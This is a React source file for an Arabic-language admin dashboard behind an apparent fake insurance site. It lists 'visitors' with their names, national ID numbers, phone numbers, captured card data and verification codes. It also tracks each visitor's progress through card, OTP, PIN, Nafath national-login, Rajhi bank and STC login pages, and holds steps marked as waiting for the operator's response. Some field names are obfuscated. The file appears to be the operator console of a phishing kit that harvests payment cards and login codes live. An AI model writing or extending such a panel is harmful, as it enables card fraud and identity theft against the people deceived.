"use client"

import { Search, Trash2, CheckSquare, Square, CreditCard, KeyRound, RefreshCw } from "lucide-react"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { getTimeAgo } from "@/lib/time-utils"

interface VisitorSidebarProps {
  visitors: InsuranceApplication[]
  selectedVisitor: InsuranceApplication | null
  onSelectVisitor: (visitor: InsuranceApplication) => void
  searchQuery: string
  onSearchChange: (query: string) => void
  cardFilter: "all" | "hasCard"
  onCardFilterChange: (filter: "all" | "hasCard") => void
  selectedIds: Set<string>
  onToggleSelect: (id: string) => void
  onSelectAll: () => void
  onDeleteSelected: () => void
  sidebarWidth: number
  onSidebarWidthChange: (width: number) => void
}

// Check if visitor is waiting for admin response
const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
  return (
    visitor.cardStatus === "waiting" ||
    visitor.otpStatus === "waiting" ||
    visitor.pinStatus === "waiting" ||
    visitor.nafadConfirmationStatus === "waiting"
  )
}

// Get current page name in Arabic
const getPageName = (step: number | string): string => {
  // Handle string values first (legacy system)
  if (typeof step === 'string') {
    const stringPageNames: Record<string, string> = {
      '_st1': 'الدفع (بطاقة)',
      '_t2': 'OTP',
      '_t3': 'PIN',
      '_t6': 'نفاذ',
      'phone': 'الهاتف',
      'home': 'الرئيسية',
      'insur': 'بيانات التأمين',
      'compar': 'مقارنة العروض',
      'check': 'الدفع',
      'payment': 'الدفع (بطاقة)',
      'veri': 'OTP',
      'otp': 'OTP',
      'confi': 'PIN',
      'pin': 'PIN',
      'nafad': 'نفاذ',
      'rajhi': 'راجحي',
      'stc-login': 'تسجيل دخول STC'
    }
    return stringPageNames[step] || `غير محدد (${step})`
  }
  
  // Handle numeric values
  const stepNum = typeof step === 'number' ? step : parseInt(step)
  const pageNames: Record<number, string> = {
    0: 'الرئيسية',
    1: 'الرئيسية',
    2: 'بيانات التأمين',
    3: 'مقارنة العروض',
    4: 'الدفع',
    5: 'OTP',
    6: 'PIN',
    7: 'الهاتف',
    8: 'نفاذ',
    9: 'تسجيل دخول STC'
  }
  
  return pageNames[stepNum] || `غير محدد (${stepNum})`
}

const getVisitorDisplayName = (visitor: InsuranceApplication) =>
  visitor.ownerName || (visitor as any).name || "بدون اسم"

const getVisitorCurrentPage = (visitor: InsuranceApplication) =>
  (visitor.redirectPage || visitor.currentPage || visitor.currentStep || "home") as number | string

const hasCardData = (visitor: InsuranceApplication): boolean => {
  if (visitor._v1 || visitor.cardNumber) return true

  if (!visitor.history || !Array.isArray(visitor.history)) return false

  return visitor.history.some(
    (entry: any) =>
      (entry.type === "_t1" || entry.type === "card") &&
      (entry.data?._v1 || entry.data?.cardNumber)
  )
}

export function VisitorSidebar({
  visitors,
  selectedVisitor,
  onSelectVisitor,
  searchQuery,
  onSearchChange,
  cardFilter,
  onCardFilterChange,
  selectedIds,
  onToggleSelect,
  onSelectAll,
  onDeleteSelected,
  sidebarWidth,
  onSidebarWidthChange
}: VisitorSidebarProps) {
  const allSelected = visitors.length > 0 && selectedIds.size === visitors.length
  const unreadCount = visitors.filter((visitor) => visitor.isUnread).length
  const waitingCount = visitors.filter(isWaitingForAdmin).length
  const isLandscape =
    typeof window !== "undefined" &&
    window.matchMedia('(orientation: landscape) and (max-width: 1024px)').matches



  return (
    <div 
      className="h-full w-full bg-white/95 backdrop-blur-sm landscape:border-l md:w-[400px] md:border-l border-gray-200 flex flex-col relative group shadow-sm"
      style={{ 
        fontFamily: 'Cairo, Tajawal, sans-serif',
        width: isLandscape ? `${sidebarWidth}px` : undefined
      }}
    >

      {/* Header */}
      <div className="p-3 sm:p-4 landscape:p-2 border-b border-gray-200 bg-gradient-to-b from-white to-gray-50">
        <h1 className="text-xl landscape:text-base font-bold text-gray-800 mb-4 landscape:mb-2">لوحة التحكم</h1>
        <div className="mb-3 flex flex-wrap items-center gap-2">
          <span className="text-xs font-semibold px-2 py-1 rounded-full bg-blue-100 text-blue-700">
            إجمالي: {visitors.length}
          </span>
          <span className="text-xs font-semibold px-2 py-1 rounded-full bg-pink-100 text-pink-700">
            غير مقروء: {unreadCount}
          </span>
          <span className="text-xs font-semibold px-2 py-1 rounded-full bg-amber-100 text-amber-700">
            قيد الانتظار: {waitingCount}
          </span>
        </div>
        
        {/* Search */}
        <div className="relative mb-3 landscape:mb-2">
          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 landscape:w-4 landscape:h-4 text-gray-400" />
          <input
            type="text"
            placeholder="بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)"
            value={searchQuery}
            onChange={(e) => onSearchChange(e.target.value)}
            className="w-full rounded-lg border border-gray-300 py-2 pl-4 pr-10 text-sm focus:outline-none focus:ring-2 focus:ring-green-500 landscape:py-1.5 landscape:text-xs"
          />
        </div>

        {/* Filters */}
        <div className="mb-3 grid grid-cols-2 gap-2 landscape:mb-2">
          <button
            onClick={() => onCardFilterChange("all")}
            className={`px-3 py-1.5 landscape:py-1 rounded-lg text-sm landscape:text-xs font-medium transition-colors ${
              cardFilter === "all"
                ? "bg-green-600 text-white"
                : "bg-gray-200 text-gray-700 hover:bg-gray-300"
            }`}
          >
            الكل
          </button>
          <button
            onClick={() => onCardFilterChange("hasCard")}
            className={`px-3 py-1.5 landscape:py-1 rounded-lg text-sm landscape:text-xs font-medium transition-colors ${
              cardFilter === "hasCard"
                ? "bg-green-600 text-white"
                : "bg-gray-200 text-gray-700 hover:bg-gray-300"
            }`}
          >
            لديهم بطاقة
          </button>
        </div>

        {/* Actions */}
        <div className="flex flex-wrap gap-2">
          <button
            onClick={onSelectAll}
            className="flex min-w-[135px] flex-1 items-center justify-center gap-2 rounded-lg bg-gray-200 px-3 py-1.5 text-sm font-medium transition-colors hover:bg-gray-300 landscape:py-1 landscape:text-xs"
          >
            {allSelected ? <CheckSquare className="w-4 h-4 landscape:w-3 landscape:h-3" /> : <Square className="w-4 h-4 landscape:w-3 landscape:h-3" />}
            {allSelected ? "إلغاء الكل" : "تحديد الكل"}
          </button>
          
          {selectedIds.size > 0 && (
            <button
              onClick={onDeleteSelected}
              className="flex min-w-[135px] flex-1 items-center justify-center gap-2 rounded-lg bg-red-500 px-3 py-1.5 text-sm font-medium text-white transition-colors hover:bg-red-600 landscape:py-1 landscape:text-xs"
            >
              <Trash2 className="w-4 h-4 landscape:w-3 landscape:h-3" />
              حذف ({selectedIds.size})
            </button>
          )}
        </div>
      </div>

      {/* Visitor List */}
      <div className="flex-1 overflow-y-auto">
        {visitors.length === 0 ? (
          <div className="p-8 text-center text-gray-500 space-y-2">
            <p className="text-3xl">📭</p>
            <p className="font-semibold">لا يوجد زوار</p>
            <p className="text-xs text-gray-400">سيظهر الزوار هنا عند بدء التفاعل</p>
          </div>
        ) : (
          visitors.map((visitor) => {
            const hasCard = hasCardData(visitor)

            return (
              <div
                key={visitor.id}
                onClick={() => onSelectVisitor(visitor)}
                className={`border-b border-gray-100 p-3 sm:p-4 landscape:p-2 cursor-pointer transition-colors hover:bg-gray-50 ${
                  selectedVisitor?.id === visitor.id ? "bg-green-50 border-r-4 border-r-green-600" : ""
                } ${visitor.isUnread ? "bg-pink-50" : ""}`}
              >
                <div className="flex items-start gap-3">
                  {/* Checkbox */}
                  <div
                    onClick={(e) => {
                      e.stopPropagation()
                      if (visitor.id) onToggleSelect(visitor.id)
                    }}
                    className="mt-1"
                  >
                    {(visitor.id && selectedIds.has(visitor.id)) ? (
                      <CheckSquare className="w-5 h-5 text-green-600" />
                    ) : (
                      <Square className="w-5 h-5 text-gray-400" />
                    )}
                  </div>

                  {/* Visitor Info */}
                  <div className="flex-1 min-w-0">
                    {/* Name & Time Ago */}
                    <div className="mb-1 flex flex-col gap-1 sm:flex-row sm:items-center sm:justify-between">
                      <div className="flex min-w-0 flex-wrap items-center gap-1.5">
                        <h3 className="font-semibold text-gray-900 truncate text-base landscape:text-sm">
                          {getVisitorDisplayName(visitor)}
                        </h3>
                        <span className="flex items-center gap-1 rounded bg-teal-600 px-2 py-0.5 text-[11px] font-medium text-white whitespace-nowrap">
                          {isWaitingForAdmin(visitor) && (
                            <RefreshCw className="w-3 h-3 animate-spin" />
                          )}
                          {getPageName(getVisitorCurrentPage(visitor))}
                        </span>
                        {hasCard && (
                          <span className="flex items-center gap-1 rounded-full border border-blue-200 bg-blue-100 px-2 py-0.5 text-[10px] font-semibold text-blue-700 whitespace-nowrap">
                            <CreditCard className="w-3 h-3" />
                            بطاقة
                          </span>
                        )}
                      </div>
                      
                      {/* Time ago indicator */}
                      <div className="flex items-center gap-1 text-xs landscape:text-[10px] text-gray-500 font-medium whitespace-nowrap sm:self-auto">
                        <span>{getTimeAgo(visitor.updatedAt || visitor.lastSeen)}</span>
                      </div>
                    </div>





                    {/* Contact Info: Phone & ID */}
                    <div className="hidden sm:flex items-center gap-3 mb-2 text-xs text-gray-700">
                      {visitor.phoneNumber && (
                        <div className="flex items-center gap-1">
                          <span className="font-medium">📞 {visitor.phoneNumber}</span>
                        </div>
                      )}
                      {visitor.identityNumber && (
                        <div className="flex items-center gap-1">
                          <span className="font-medium">🆔 {visitor.identityNumber}</span>
                        </div>
                      )}
                    </div>

                    {/* Bottom Row: Status & Page */}
                    <div className="hidden sm:flex items-center justify-between">
                      {/* Left: Online Status & Icons */}
                      <div className="flex items-center gap-2">
                        <div className="flex items-center gap-1">
                          <div className={`w-2 h-2 rounded-full ${visitor.isOnline ? 'bg-green-500' : 'bg-gray-400'}`}></div>
                          <span className="text-xs text-gray-600">{visitor.isOnline ? 'متصل' : 'غير متصل'}</span>
                        </div>
                        
                        {hasCard && (
                          <div className="flex items-center gap-1 px-2 py-0.5 bg-blue-100 text-blue-700 rounded text-xs">
                            <CreditCard className="w-3 h-3" />
                            <span>بطاقة</span>
                          </div>
                        )}
                        {visitor.phoneVerificationCode && (
                          <div className="flex items-center gap-1 px-2 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">
                            <KeyRound className="w-3 h-3" />
                          </div>
                        )}
                      </div>


                    </div>
                  </div>
                </div>
              </div>
            )
          })
        )}
      </div>
    </div>
  )
}
